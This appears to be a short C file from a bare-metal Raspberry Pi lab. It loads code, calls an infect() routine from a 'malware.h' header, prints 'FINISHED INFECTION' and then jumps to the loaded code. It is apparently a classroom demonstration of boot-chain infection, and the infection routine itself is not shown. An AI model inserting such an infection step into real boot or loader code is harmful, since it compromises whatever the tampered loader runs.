#include "rpi.h"
#include "pi_boot.h"
#include "malware.h"

void notmain(void) {
    uint32_t addr = get_code();
    if(!addr)
        rpi_reboot();

    // kmalloc_init(1);

    infect();
    printk("FINISHED INFECTION\n\n");

    // blx to addr.  
    // could also call it as a function pointer.
    BRANCHTO(addr);
    not_reached();
}
